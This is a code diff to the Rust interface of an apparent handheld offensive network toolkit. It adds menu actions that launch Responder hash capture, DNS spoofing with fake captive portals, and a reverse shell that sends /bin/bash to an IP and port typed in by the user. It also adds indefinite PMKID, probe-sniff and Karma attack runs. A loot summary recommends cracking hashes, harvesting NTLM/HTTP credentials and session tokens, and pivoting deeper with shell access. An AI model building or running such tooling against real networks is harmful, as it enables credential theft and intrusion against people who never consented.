@@ -15,10 +15,11 @@ use std::collections::HashMap;
 use anyhow::{anyhow, bail, Context, Result};
 use chrono::Local;
 use rustyjack_core::cli::{
-    Commands, DiscordCommand, DiscordSendArgs, DnsSpoofCommand, DnsSpoofStartArgs, EthernetCommand,
-    EthernetDiscoverArgs, EthernetInventoryArgs, EthernetPortScanArgs, EthernetSiteCredArgs,
-    AutopilotCommand, AutopilotMode, AutopilotStartArgs, HardwareCommand, HotspotCommand,
-    HotspotStartArgs, LootCommand, LootReadArgs, MitmCommand, MitmStartArgs, NotifyCommand,
+    AutopilotCommand, AutopilotMode, AutopilotStartArgs, Commands, DiscordCommand,
+    DiscordSendArgs, DnsSpoofCommand, DnsSpoofStartArgs, EthernetCommand, EthernetDiscoverArgs,
+    EthernetInventoryArgs, EthernetPortScanArgs, EthernetSiteCredArgs, HardwareCommand,
+    HotspotCommand, HotspotStartArgs, LootCommand, LootReadArgs, MitmCommand, MitmStartArgs,
+    NotifyCommand, ResponderArgs, ResponderCommand, ReverseCommand, ReverseLaunchArgs,
     SystemCommand, WifiCommand, WifiDeauthArgs, WifiDisconnectArgs, WifiProfileCommand,
     WifiProfileConnectArgs, WifiProfileDeleteArgs, WifiRouteCommand, WifiRouteEnsureArgs,
     WifiScanArgs, WifiStatusArgs,
@@ -245,6 +246,8 @@ struct PipelineResult {
     clients_found: u32,
 }
 
+const INDEFINITE_SECS: u32 = 86_400; // 24h stand-in for "run until stopped"
+
 enum StepOutcome {
     Completed(Option<(u32, u32, Option<String>, u32, u32)>),
     Skipped(String),
@@ -345,6 +348,17 @@ impl App {
                 ],
             );
         }
+        if !interface_has_ip(&active_interface) {
+            return self.show_message(
+                "Route",
+                [
+                    &format!("Interface: {}", active_interface),
+                    "No IPv4 address.",
+                    "Connect first, then set",
+                    "default route.",
+                ],
+            );
+        }
 
         match self.ensure_route_for_interface(&active_interface) {
             Ok(Some(msg)) => self.show_message("Route", [msg]),
@@ -353,7 +367,66 @@ impl App {
         }
     }
 
+    fn require_connected_wireless(&mut self, title: &str) -> Result<Option<String>> {
+        let iface = self.config.settings.active_network_interface.clone();
+        if iface.is_empty() {
+            self.show_message(title, ["No active interface set", "Run Hardware Detect first"])?;
+            return Ok(None);
+        }
+
+        let wireless_dir = format!("/sys/class/net/{}/wireless", iface);
+        if !Path::new(&wireless_dir).exists() {
+            self.show_message(
+                title,
+                [
+                    &format!("Interface: {}", iface),
+                    "Requires wireless interface",
+                    "connected with an IP.",
+                ],
+            )?;
+            return Ok(None);
+        }
+
+        if !self.interface_has_carrier(&iface) {
+            self.show_message(
+                title,
+                [
+                    &format!("Interface: {}", iface),
+                    "Link is down / no AP",
+                    "Connect first, then retry",
+                ],
+            )?;
+            return Ok(None);
+        }
+
+        if !interface_has_ip(&iface) {
+            self.show_message(
+                title,
+                [
+                    &format!("Interface: {}", iface),
+                    "No IPv4 address.",
+                    "Connect to a network",
+                    "before running this.",
+                ],
+            )?;
+            return Ok(None);
+        }
+
+        if !self.mode_allows_active("Blocked in Stealth mode")? {
+            return Ok(None);
+        }
+
+        Ok(Some(iface))
+    }
+
     fn ensure_route_for_interface(&mut self, interface: &str) -> Result<Option<String>> {
+        if interface.is_empty() {
+            return Ok(None);
+        }
+        if !interface_has_ip(interface) {
+            return Ok(None);
+        }
+
         let args = WifiRouteEnsureArgs {
             interface: interface.to_string(),
         };
@@ -658,7 +731,7 @@ impl App {
                 } else if duration_secs > 0 {
                     "Finalizing... [LEFT=Cancel]".to_string()
                 } else {
-                    "Running... [LEFT=Cancel]".to_string()
+                    format!("Elapsed: {}s [LEFT/Main=Stop]", elapsed)
                 };
 
                 let overlay = self.stats.snapshot();
@@ -1002,6 +1075,11 @@ impl App {
             MenuAction::WifiStatus => self.show_wifi_status()?,
             MenuAction::WifiDisconnect => self.disconnect_wifi()?,
             MenuAction::WifiEnsureRoute => self.ensure_route()?,
+            MenuAction::ResponderOn => self.start_responder()?,
+            MenuAction::ResponderOff => self.stop_responder()?,
+            MenuAction::DnsSpoofStart => self.start_dns_spoof()?,
+            MenuAction::DnsSpoofStop => self.stop_dns_spoof()?,
+            MenuAction::ReverseShell => self.launch_reverse_shell()?,
             MenuAction::AutopilotStart(mode) => self.start_autopilot(mode)?,
             MenuAction::AutopilotStop => self.stop_autopilot()?,
             MenuAction::AutopilotStatus => self.show_autopilot_status()?,
@@ -2694,6 +2772,187 @@ impl App {
         }
     }
 
+    fn start_responder(&mut self) -> Result<()> {
+        let Some(iface) = self.require_connected_wireless("Responder")? else {
+            return Ok(());
+        };
+
+        self.show_message(
+            "Responder",
+            [
+                "Listens on this network",
+                "for LLMNR/NBT/MDNS and",
+                "captures hashes/creds.",
+                "",
+                "Press Start to launch.",
+                "Stop via Responder Off.",
+            ],
+        )?;
+        let confirm = self.choose_from_list("Start Responder?", &["Start".to_string(), "Cancel".to_string()])?;
+        if confirm != Some(0) {
+            return Ok(());
+        }
+
+        let args = ResponderArgs {
+            interface: Some(iface.clone()),
+        };
+        match self
+            .core
+            .dispatch(Commands::Responder(ResponderCommand::On(args)))
+        {
+            Ok((msg, _)) => self.show_message(
+                "Responder",
+                [msg, format!("Interface: {}", iface), "Loot: Responder/logs".to_string()],
+            ),
+            Err(e) => self.show_message("Responder", [format!("Start failed: {}", e)]),
+        }
+    }
+
+    fn stop_responder(&mut self) -> Result<()> {
+        match self.core.dispatch(Commands::Responder(ResponderCommand::Off)) {
+            Ok((msg, _)) => self.show_message("Responder", [msg]),
+            Err(e) => self.show_message("Responder", [format!("Stop failed: {}", e)]),
+        }
+    }
+
+    fn start_dns_spoof(&mut self) -> Result<()> {
+        let Some(iface) = self.require_connected_wireless("DNS Spoof")? else {
+            return Ok(());
+        };
+
+        let sites = self.list_dnsspoof_sites();
+        if sites.is_empty() {
+            return self.show_message(
+                "DNS Spoof",
+                [
+                    "No site templates found.",
+                    "Add folders under",
+                    "DNSSpoof/sites/<name>",
+                ],
+            );
+        }
+        let choice = self.choose_dnsspoof_site(&sites)?;
+        let Some(site) = choice else { return Ok(()); };
+
+        self.show_message(
+            "DNS Spoof",
+            [
+                "Hijacks DNS on this WLAN",
+                "and serves the selected",
+                "site/captive portal.",
+                "",
+                "Press Start to launch.",
+                "Stop via Stop DNS Spoof.",
+            ],
+        )?;
+        let confirm = self.choose_from_list("Start DNS Spoof?", &["Start".to_string(), "Cancel".to_string()])?;
+        if confirm != Some(0) {
+            return Ok(());
+        }
+
+        let args = DnsSpoofStartArgs {
+            site: site.clone(),
+            interface: Some(iface.clone()),
+            loot_dir: None,
+        };
+
+        match self
+            .core
+            .dispatch(Commands::DnsSpoof(DnsSpoofCommand::Start(args)))
+        {
+            Ok((msg, _)) => self.show_message(
+                "DNS Spoof",
+                [
+                    msg,
+                    format!("Site: {}", site),
+                    format!("Interface: {}", iface),
+                ],
+            ),
+            Err(e) => self.show_message("DNS Spoof", [format!("Start failed: {}", e)]),
+        }
+    }
+
+    fn stop_dns_spoof(&mut self) -> Result<()> {
+        match self
+            .core
+            .dispatch(Commands::DnsSpoof(DnsSpoofCommand::Stop))
+        {
+            Ok((msg, _)) => self.show_message("DNS Spoof", [msg]),
+            Err(e) => self.show_message("DNS Spoof", [format!("Stop failed: {}", e)]),
+        }
+    }
+
+    fn launch_reverse_shell(&mut self) -> Result<()> {
+        let Some(iface) = self.require_connected_wireless("Reverse Shell")? else {
+            return Ok(());
+        };
+
+        self.show_message(
+            "Reverse Shell",
+            [
+                "Connects back to a host",
+                "with /bin/bash via TCP.",
+                "",
+                "Ensure listener is ready.",
+                "Press Start to continue.",
+            ],
+        )?;
+        let cont = self.choose_from_list("Launch shell?", &["Start".to_string(), "Cancel".to_string()])?;
+        if cont != Some(0) {
+            return Ok(());
+        }
+
+        // Prompt for target IP octets
+        let mut octets = Vec::new();
+        for i in 0..4 {
+            let prefix = match i {
+                0 => "Target",
+                1 => "Target",
+                2 => "Target",
+                _ => "Target",
+            };
+            let part = self.prompt_octet(prefix)?;
+            let Some(val) = part else { return Ok(()); };
+            octets.push(val);
+        }
+        let target_ip = format!(
+            "{}.{}.{}.{}",
+            octets[0], octets[1], octets[2], octets[3]
+        );
+
+        // Prompt for port (common choices)
+        let ports = vec!["4444", "9001", "1337", "5555"];
+        let port_choice = self.choose_from_list("LPORT", &ports.iter().map(|s| s.to_string()).collect::<Vec<_>>())?;
+        let port: u16 = port_choice
+            .and_then(|idx| ports.get(idx))
+            .and_then(|p| p.parse().ok())
+            .unwrap_or(4444);
+
+        let args = ReverseLaunchArgs {
+            target: target_ip.clone(),
+            port,
+            shell: "/bin/bash".to_string(),
+            interface: Some(iface.clone()),
+        };
+
+        match self
+            .core
+            .dispatch(Commands::Reverse(ReverseCommand::Launch(args)))
+        {
+            Ok((msg, _)) => self.show_message(
+                "Reverse Shell",
+                [
+                    msg,
+                    format!("Target: {}", target_ip),
+                    format!("Port: {}", port),
+                    format!("Iface: {}", iface),
+                ],
+            ),
+            Err(e) => self.show_message("Reverse Shell", [format!("Launch failed: {}", e)]),
+        }
+    }
+
+
     fn show_autopilot_status(&mut self) -> Result<()> {
         match self
             .core
@@ -3355,6 +3614,7 @@ impl App {
             "30 seconds".to_string(),
             "1 minute".to_string(),
             "5 minutes".to_string(),
+            "Indefinite".to_string(),
         ];
         let dur_choice = self.choose_from_list("Sniff Duration", &durations)?;
 
@@ -3362,8 +3622,20 @@ impl App {
             Some(0) => 30,
             Some(1) => 60,
             Some(2) => 300,
+            Some(3) => INDEFINITE_SECS,
             _ => return Ok(()),
         };
+
+        if duration_secs == INDEFINITE_SECS {
+            self.show_message(
+                "Probe Sniff",
+                [
+                    "Running indefinitely.",
+                    "Press LEFT/Main Menu",
+                    "to stop. Elapsed shown.",
+                ],
+            )?;
+        }
 
         use rustyjack_core::{Commands, WifiCommand, WifiProbeSniffArgs};
 
@@ -3444,6 +3716,7 @@ impl App {
                 format!("Target: {}", target_network)
             },
             "Passive (any network)".to_string(),
+            "Indefinite (manual stop)".to_string(),
             "Cancel".to_string(),
         ];
 
@@ -3452,8 +3725,20 @@ impl App {
         let (use_target, duration) = match choice {
             Some(0) if !target_network.is_empty() => (true, 30),
             Some(1) | Some(0) => (false, 60),
+            Some(2) => (false, INDEFINITE_SECS),
             _ => return Ok(()),
         };
+
+        if duration == INDEFINITE_SECS {
+            self.show_message(
+                "PMKID Capture",
+                [
+                    "Running indefinitely.",
+                    "Press LEFT/Main Menu",
+                    "to stop. Elapsed shown.",
+                ],
+            )?;
+        }
 
         use rustyjack_core::{Commands, WifiCommand, WifiPmkidArgs};
 
@@ -4272,6 +4557,7 @@ impl App {
             "2 minutes".to_string(),
             "5 minutes".to_string(),
             "10 minutes".to_string(),
+            "Indefinite".to_string(),
         ];
         let dur_choice = self.choose_from_list("Karma Duration", &durations)?;
 
@@ -4279,8 +4565,20 @@ impl App {
             Some(0) => 120,
             Some(1) => 300,
             Some(2) => 600,
+            Some(3) => INDEFINITE_SECS,
             _ => return Ok(()),
         };
+
+        if duration == INDEFINITE_SECS {
+            self.show_message(
+                "Karma Attack",
+                [
+                    "Running indefinitely.",
+                    "Press LEFT/Main Menu",
+                    "to stop. Elapsed shown.",
+                ],
+            )?;
+        }
 
         // Ask if they want to create a fake AP
         let ap_options = vec![
@@ -7576,6 +7874,14 @@ impl App {
             return;
         }
 
+        // Responder/DNS spoof/reverse shell context
+        let responder_logs = self.root.join("Responder").join("logs");
+        let dnsspoof_caps = self.root.join("DNSSpoof").join("captures");
+        let responder_present = dir_has_files(&responder_logs);
+        let dnsspoof_present = dir_has_files(&dnsspoof_caps);
+        let (reverse_shells, bridge_events, payload_samples) = self.summarize_payload_activity();
+        let bridge_pcaps = self.count_bridge_pcaps();
+
         let handshake_count = self.count_handshake_files(wifi_dir);
         if handshake_count > 0 {
             lines.push(format!("Captures: {} file(s)", handshake_count));
@@ -7586,6 +7892,44 @@ impl App {
         } else {
             lines.push("Captures: none found".to_string());
             next_steps.push("Attempt handshake/PMKID capture to obtain credentials.".to_string());
+        }
+
+        // Responder loot summary
+        if responder_present {
+            lines.push("Responder loot present".to_string());
+            insights.push("Responder/hash capture available; attempt cracking/relay.".to_string());
+            next_steps.push("Review Responder/logs for captured hashes/creds.".to_string());
+        }
+
+        // DNS spoof captures
+        if dnsspoof_present {
+            lines.push("DNS spoof captures present".to_string());
+            insights.push("Portal activity recorded; check visits/credentials.".to_string());
+            next_steps.push("Inspect DNSSpoof/captures for creds/visits.".to_string());
+        }
+
+        // Payload-driven actions (reverse shells, bridges)
+        if reverse_shells > 0 || bridge_events > 0 || bridge_pcaps > 0 {
+            lines.push("Post-connection payloads:".to_string());
+            if reverse_shells > 0 {
+                lines.push(format!("Reverse shells launched: {}", reverse_shells));
+                insights.push("Reverse shells were launched; ensure callbacks stay controlled.".to_string());
+                next_steps.push("Review payload.log and close shells that are no longer needed.".to_string());
+            }
+            if bridge_events > 0 {
+                lines.push(format!("Bridge toggles logged: {}", bridge_events));
+                insights.push("Transparent bridge used; captures may hold in-transit credentials.".to_string());
+                next_steps.push("Review bridge PCAPs for credentials/session tokens.".to_string());
+            }
+            if bridge_pcaps > 0 {
+                lines.push(format!("Bridge captures: {} PCAP(s)", bridge_pcaps));
+            }
+            if !payload_samples.is_empty() {
+                lines.push("Recent payload log entries:".to_string());
+                for entry in payload_samples.iter().rev().take(3) {
+                    lines.push(format!(" - {}", shorten_for_display(entry, 72)));
+                }
+            }
         }
 
         self.append_artifact_section("Wireless loot sweep", wifi_dir, lines, insights, next_steps);
@@ -7641,6 +7985,86 @@ impl App {
             summary.push(format!("MAC entries: {}", mac_count));
         }
 
+        let responder_logs = self.root.join("Responder").join("logs");
+        let dnsspoof_caps = self.root.join("DNSSpoof").join("captures");
+        let responder_present = dir_has_files(&responder_logs);
+        let dnsspoof_present = dir_has_files(&dnsspoof_caps);
+        if responder_present {
+            summary.push("Responder loot captured".to_string());
+        }
+        if dnsspoof_present {
+            summary.push("DNS spoof captures present".to_string());
+        }
+
+        let (reverse_shells, bridge_events, _) = self.summarize_payload_activity();
+        let bridge_pcaps = self.count_bridge_pcaps();
+        if reverse_shells > 0 {
+            summary.push(format!("Reverse shells: {}", reverse_shells));
+        }
+        if bridge_pcaps > 0 {
+            summary.push(format!("Bridge PCAPs: {}", bridge_pcaps));
+        }
+
+        // Simple next-step heuristics
+        if let Some(c) = inv_count {
+            if c > 0 && handshake_count == 0 {
+                next_steps.push(
+                    "Hosts found on wired but no wireless captures; consider wireless attacks."
+                        .to_string(),
+                );
+            }
+        }
+        if handshake_count > 0 && responder_present {
+            insights.push(
+                "Wireless captures + Responder hashes collected; prioritize credential cracking."
+                    .to_string(),
+            );
+        }
+        if dnsspoof_present && handshake_count == 0 {
+            next_steps.push(
+                "DNS spoof run captured visits; follow up with wireless capture/handshake if needed."
+                    .to_string(),
+            );
+        }
+        if dnsspoof_present && !responder_present {
+            next_steps.push(
+                "Pair DNS spoof with Responder to harvest NTLM/HTTP credentials during portal use."
+                    .to_string(),
+            );
+        }
+        if reverse_shells > 0 {
+            insights.push(
+                "Reverse shell callbacks launched; ensure only intended hosts are phoning home."
+                    .to_string(),
+            );
+            next_steps.push("Audit payload.log and shut down shells after testing.".to_string());
+        }
+        if bridge_pcaps > 0 {
+            insights.push(
+                "Transparent bridge captures exist; PCAPs may hold cleartext credentials."
+                    .to_string(),
+            );
+            next_steps.push("Review bridge PCAPs for credentials/session tokens.".to_string());
+        }
+        if handshake_count > 0 && dnsspoof_present {
+            next_steps.push(
+                "Use portal traffic plus wireless captures to correlate victims and crack credentials."
+                    .to_string(),
+            );
+        }
+        if reverse_shells > 0 && handshake_count > 0 {
+            next_steps.push(
+                "Combine cracked Wi-Fi creds with reverse shell access to pivot deeper."
+                    .to_string(),
+            );
+        }
+        if bridge_events > 0 && inv_count.unwrap_or(0) > 0 && handshake_count == 0 {
+            next_steps.push(
+                "Bridge captures without wireless loot; harvest creds from PCAPs or add handshake capture."
+                    .to_string(),
+            );
+        }
+
         if summary.is_empty() {
             lines.push("No cross-medium data yet; collect Ethernet and Wireless loot.".to_string());
             next_steps.push(
@@ -7671,6 +8095,66 @@ impl App {
             "Combined view links wired hosts, wireless captures, and MAC usage per network."
                 .to_string(),
         );
+    }
+
+    fn summarize_payload_activity(&self) -> (usize, usize, Vec<String>) {
+        let path = self.root.join("loot").join("payload.log");
+        let mut reverse_shells = 0usize;
+        let mut bridge_events = 0usize;
+        let mut recent = Vec::new();
+        if let Ok(file) = File::open(&path) {
+            for line in BufReader::new(file).lines().flatten() {
+                let lower = line.to_ascii_lowercase();
+                let mut matched = false;
+                if lower.contains("reverse-shell") {
+                    reverse_shells += 1;
+                    matched = true;
+                }
+                if lower.contains("bridge start") || lower.contains("bridge stop") {
+                    bridge_events += 1;
+                    matched = true;
+                }
+                if matched {
+                    recent.push(line.clone());
+                    if recent.len() > 5 {
+                        recent.remove(0);
+                    }
+                }
+            }
+        }
+        (reverse_shells, bridge_events, recent)
+    }
+
+    fn count_bridge_pcaps(&self) -> usize {
+        let eth_root = self.root.join("loot").join("Ethernet");
+        if !eth_root.exists() {
+            return 0;
+        }
+        let mut pcaps = 0usize;
+        if let Ok(entries) = fs::read_dir(&eth_root) {
+            for entry in entries.flatten() {
+                let path = entry.path();
+                if !path.is_dir() {
+                    continue;
+                }
+                let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
+                if !name.starts_with("bridge_") {
+                    continue;
+                }
+                for item in WalkDir::new(&path).into_iter().flatten() {
+                    let p = item.path();
+                    if !p.is_file() {
+                        continue;
+                    }
+                    if let Some(fname) = p.file_name().and_then(|n| n.to_str()) {
+                        if fname.starts_with("mitm_") && fname.ends_with(".pcap") {
+                            pcaps += 1;
+                        }
+                    }
+                }
+            }
+        }
+        pcaps
     }
 
     fn summarize_mac_usage(&self, network: &str) -> Vec<String> {
@@ -8823,6 +9307,16 @@ fn interface_has_ip(interface: &str) -> bool {
         let _ = interface;
         false
     }
+}
+
+fn dir_has_files(dir: &Path) -> bool {
+    if !dir.exists() {
+        return false;
+    }
+    fs::read_dir(dir)
+        .ok()
+        .and_then(|mut it| it.next())
+        .is_some()
 }
 
 fn shorten_for_display(value: &str, max_len: usize) -> String {
